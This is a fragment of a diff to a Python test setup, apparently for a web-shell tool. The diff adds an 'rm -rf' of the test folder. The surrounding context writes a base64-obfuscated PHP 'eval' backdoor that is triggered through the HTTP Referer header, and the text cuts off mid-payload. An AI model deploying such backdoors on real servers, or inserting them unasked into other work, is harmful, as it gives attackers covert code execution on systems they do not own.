@@ -18,6 +18,7 @@ def setUpModule():
     subprocess.check_output("""
 BASE_FOLDER="{config.base_folder}/test_channels/"
 PWD="{config.password}"
+rm -rf "$BASE_FOLDER"
 mkdir -p "$BASE_FOLDER"
 echo "<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWy\
 dIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBj\
